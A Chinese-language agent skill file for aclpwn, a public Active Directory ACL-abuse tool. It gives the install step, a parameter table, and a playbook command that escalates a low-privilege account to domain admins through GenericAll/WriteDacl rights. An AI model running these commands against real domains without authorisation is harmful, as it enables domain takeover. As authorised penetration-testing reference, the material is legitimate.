---
name: aclpwn-acl-abuse
description: 渗透工具 skill:aclpwn 的安装、参数速查与攻击场景 playbook。当任务涉及 AD域渗透与域控攻击 需要调用 aclpwn 时使用。
---

# aclpwn

- 攻击大类:C30 AD域渗透与域控攻击
- 上游仓库:https://github.com/fox-it/aclpwn.py
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install aclpwn
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `aclpwn -f svc -t 'domain admins' -d corp.local` | ACL 提权路径 |
| `-f user -t target -cp` | BloodHound 数据 |
| `-d domain -u u -p p` | 凭据 |

## 攻击场景 Playbook

### ACL 滥用自动化

```bash
aclpwn -f lowpriv -t 'domain admins' -d corp.local -du dc01
# GenericAll/WriteDacl 自动提权
```

## 注意事项

fox-it 出品,ACL 攻击路径自动化。
